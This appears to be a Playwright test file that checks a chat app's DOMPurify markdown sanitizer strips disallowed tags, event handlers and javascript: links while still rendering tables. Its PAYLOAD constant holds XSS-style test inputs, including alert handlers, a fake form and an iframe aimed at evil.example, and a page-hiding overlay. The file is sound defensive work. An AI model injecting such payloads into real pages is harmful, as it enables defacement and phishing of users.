"""
The multiplexer's markdown sanitizer keeps only its own allowlist — measured in a real browser (row 5ae3ce90).

THE DEFECT. `render/markdown.ts` passed `USE_PROFILES: { html: true }` to DOMPurify alongside an explicit
`ALLOWED_TAGS` / `ALLOWED_ATTR`. DOMPurify applies a profile after those lists and resets them to the whole
profile, so the explicit lists were ignored. Measured 2026-09-10 in Chromium 145 with the vendored DOMPurify
3.3.1: a sender's <form>, <input>, <button>, <style>, style= and <details> all reached the bubble. No script
vector survived — this is page-altering HTML (a restyle, a full-viewport overlay, a fake form), not script XSS.

WHY A REAL BROWSER. Under happy-dom — where the unit tests run — DOMPurify's own default config returned
onclick and javascript: intact (measured the same day), and multiplexer/render/markdown.test.ts replaces
both libraries with stand-ins. Nothing in the unit tier can see what the browser's sanitizer lets through.

WHAT THIS FILE PINS, through the REAL markdown.ts (bundled with the repo's esbuild), the REAL vendored
marked.min.js and purify.min.js, in Chromium:

  1. every element either renderer emits is on DOMPURIFY_CONFIG.ALLOWED_TAGS — the predicate, not a list
     of known-bad tags — and every attribute is on ALLOWED_ATTR
  2. no on* handler and no javascript: link survives
  3. a GFM table still renders (the allowlist did not over-narrow)

It needs no server: the page is built with set_content. It lives in e2e_ui because that is where the
browser fixtures are, so it rides the scheduled :8000 E2E run; the session conftest there checks that server
is up.
"""

import json
import subprocess

import pytest

import cosa.utils.util as cu


STATIC = cu.get_project_root() + "/src/lupin_app/static"

PAYLOAD = (
    '<img src="x" onerror="alert(1)">'
    '<form action="https://evil.example"><input name="p"><button formaction="https://evil.example">go</button></form>'
    '<style>body{display:none}</style>'
    '<iframe src="https://evil.example"></iframe>'
    '<svg onload="alert(2)"></svg>'
    '<a href="javascript:alert(3)">j</a>'
    '<div onclick="alert(4)" style="position:fixed;inset:0">overlay</div>'
    '<details open ontoggle="alert(5)">x</details>'
    '\n\n| a | b |\n|---|:-:|\n| 1 | 2 |\n'
)

RENDERERS = [ "renderMarkdown", "renderMarkdownInline" ]


@pytest.fixture( scope="module" )
def bundle( tmp_path_factory ):
    """
    The real markdown.ts, bundled to an IIFE that exposes its exports on globalThis.

    Ensures:
        - returns the bundle's source text
        - raises CalledProcessError when esbuild cannot build it
    """
    out   = tmp_path_factory.mktemp( "bubble-sanitizer" )
    entry = out / "entry.ts"
    entry.write_text(
        f'import {{ renderMarkdown, renderMarkdownInline, DOMPURIFY_CONFIG }} from "{STATIC}/js/multiplexer/render/markdown.ts";\n'
        "Object.assign( globalThis, { renderMarkdown, renderMarkdownInline, DOMPURIFY_CONFIG } );\n"
    )
    subprocess.run(
        [ cu.get_project_root() + "/node_modules/.bin/esbuild", str( entry ), "--bundle", "--format=iife", f"--outfile={out / 'bundle.js'}" ],
        check=True, capture_output=True,
    )
    return ( out / "bundle.js" ).read_text()


@pytest.fixture
def sanitizer_page( page, bundle ):
    """A blank page carrying the vendored libraries and the bundled renderers, and nothing from any server."""
    page.set_content( "<!doctype html><html><body></body></html>" )
    page.add_script_tag( content=open( f"{STATIC}/js/vendor/marked.min.js" ).read() )
    page.add_script_tag( content=open( f"{STATIC}/js/vendor/purify.min.js" ).read() )
    page.add_script_tag( content=bundle )
    assert page.evaluate( "DOMPurify.isSupported" ) is True, "DOMPurify is not running as a real sanitizer on this page"
    return page


def _render( page, renderer ):
    """Render PAYLOAD with one renderer and report every element and attribute that survived."""
    return page.evaluate( """( [ renderer, payload ] ) => {
        const value = globalThis[ renderer ]( payload );
        const host  = document.createElement( "div" );
        host.innerHTML = value.__raw;
        const tags = new Set(), attrs = new Set();
        let handlers = 0, jsLinks = 0;
        for ( const el of host.querySelectorAll( "*" ) ) {
            tags.add( el.tagName.toLowerCase() );
            for ( const a of el.attributes ) {
                attrs.add( a.name );
                if ( a.name.startsWith( "on" ) ) handlers++;
                if ( /^\\s*javascript:/i.test( a.value ) ) jsLinks++;
            }
        }
        const aligned = [ ...host.querySelectorAll( "th[align], td[align]" ) ]
            .map( cell => `${ cell.tagName.toLowerCase() }:${ cell.textContent }:${ cell.getAttribute( "align" ) }` );
        return { tags: [ ...tags ], attrs: [ ...attrs ], handlers, jsLinks, tables: host.querySelectorAll( "table" ).length, aligned,
                 allowedTags: DOMPURIFY_CONFIG.ALLOWED_TAGS, allowedAttrs: DOMPURIFY_CONFIG.ALLOWED_ATTR };
    }""", [ renderer, PAYLOAD ] )


@pytest.mark.parametrize( "renderer", RENDERERS )
def test_every_surviving_element_is_on_the_allowlist( sanitizer_page, renderer ):
    out = _render( sanitizer_page, renderer )
    assert out[ "tags" ], "nothing survived at all — the render did not run"
    outside = sorted( set( out[ "tags" ] ) - set( out[ "allowedTags" ] ) )
    assert outside == [], f"{renderer} let tags outside ALLOWED_TAGS through: {outside} — is USE_PROFILES back?"


@pytest.mark.parametrize( "renderer", RENDERERS )
def test_every_surviving_attribute_is_on_the_allowlist( sanitizer_page, renderer ):
    out = _render( sanitizer_page, renderer )
    outside = sorted( set( out[ "attrs" ] ) - set( out[ "allowedAttrs" ] ) )
    assert outside == [], f"{renderer} let attributes outside ALLOWED_ATTR through: {outside}"


@pytest.mark.parametrize( "renderer", RENDERERS )
def test_no_handler_and_no_javascript_link_survives( sanitizer_page, renderer ):
    out = _render( sanitizer_page, renderer )
    assert ( out[ "handlers" ], out[ "jsLinks" ] ) == ( 0, 0 ), json.dumps( out )


@pytest.mark.parametrize( "renderer", RENDERERS )
def test_a_table_still_renders( sanitizer_page, renderer ):
    # The positive arm: an allowlist that stripped everything would pass every test above.
    assert _render( sanitizer_page, renderer )[ "tables" ] == 1


@pytest.mark.parametrize( "renderer", RENDERERS )
def test_a_column_alignment_survives( sanitizer_page, renderer ):
    # marked writes `|:-:|` as align="center" on that column's th and td. The profile used to let align through;
    # an allowlist without it strips it, and an aligned table renders unaligned. Column a asks for nothing, so it
    # carries nothing — that is what ties the attribute to the markdown rather than to anything else on the page.
    assert _render( sanitizer_page, renderer )[ "aligned" ] == [ "th:b:center", "td:2:center" ]


def test_the_shared_sheet_styles_a_multiplexer_bubble_table( sanitizer_page ):
    # The bubble table rules live in css/shared/notifications-surface.css, which both clients link. The legacy
    # bubble is pinned in test_a_legacy_bubble_renders_a_markdown_table.py; this is the multiplexer's
    # div.message-text. Chromium computes an honoured align="center" as `-webkit-center`.
    sanitizer_page.add_style_tag( content=open( f"{STATIC}/css/shared/notifications-surface.css" ).read() )
    style = sanitizer_page.evaluate( """( payload ) => {
        const bubble = document.createElement( "div" );
        bubble.className = "sender-message incoming";
        bubble.innerHTML = `<div class="message-text">${ renderMarkdownInline( payload ).__raw }</div>`;
        document.body.replaceChildren( bubble );
        const css = ( sel ) => getComputedStyle( bubble.querySelector( sel ) );
        return { td_border: css( "td" ).borderTopStyle, display: css( "table" ).display,
                 centred: css( "td[align]" ).textAlign, plain_th: css( "th:not([align])" ).textAlign };
    }""", PAYLOAD )
    assert style[ "td_border" ] == "solid" and style[ "display" ] == "block", f"the multiplexer bubble table is unstyled: {style}"
    assert style[ "centred" ] in ( "center", "-webkit-center" ) and style[ "plain_th" ] == "left", style
